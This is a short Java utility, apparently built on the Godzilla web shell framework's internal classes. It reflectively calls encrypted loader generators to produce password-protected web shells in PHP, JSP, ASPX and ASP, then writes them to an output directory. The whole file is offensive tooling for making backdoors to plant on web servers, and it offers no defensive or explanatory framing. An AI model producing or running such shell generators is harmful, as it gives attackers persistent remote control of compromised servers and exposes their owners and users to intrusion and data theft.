import java.lang.reflect.Method;
import java.nio.file.Files;
import java.nio.file.Path;

public class GzGen {
    static Object[] ok = {};

    public static void main(String[] args) throws Exception {
        if (args.length < 3) {
            System.out.println("用法: GzGen <pass> <key> <outdir> [base64|raw]");
            return;
        }
        String pass = args[0];
        String key = args[1];
        String outdir = args[2];
        boolean isBase64 = args.length > 3 && "base64".equalsIgnoreCase(args[3]);
        Files.createDirectories(Path.of(outdir));

        gen("php", outdir + "/gz_orig.php", pass, key, isBase64, null);
        gen("jsp", outdir + "/gz_orig.jsp", pass, key, isBase64, null);
        gen("aspx", outdir + "/gz_orig.aspx", pass, key, isBase64, null);
        gen("asp", outdir + "/gz_orig.asp", pass, key, isBase64, isBase64 ? "base64" : "raw");
        System.out.println("ALL DONE");
    }

    static void gen(String payload, String out, String pass, String key, boolean isBase64, String extra) throws Exception {
        Method m = null;
        Class<?> c = null;
        try {
            switch (payload) {
                case "php": c = Class.forName("shells.cryptions.phpXor.Generate"); m = c.getMethod("GenerateShellLoder", String.class, String.class, boolean.class); break;
                case "jsp": c = Class.forName("shells.cryptions.JavaAes.Generate"); m = c.getMethod("GenerateShellLoder", String.class, String.class, boolean.class); break;
                case "aspx": c = Class.forName("shells.cryptions.cshapAes.Generate"); m = c.getMethod("GenerateShellLoder", String.class, String.class, boolean.class); break;
                case "asp": c = Class.forName("shells.cryptions.aspXor.Generate"); m = c.getMethod("GenerateShellLoder", String.class, String.class, String.class); break;
            }
            m.setAccessible(true);
            byte[] shell = (byte[]) m.invoke(null, pass, key, extra == null ? Boolean.valueOf(isBase64) : extra);
            Files.write(Path.of(out), shell);
            System.out.println("OK " + payload + " " + shell.length + " -> " + out);
        } catch (Throwable t) {
            System.out.println("FAIL " + payload + ": " + t);
        }
    }
}
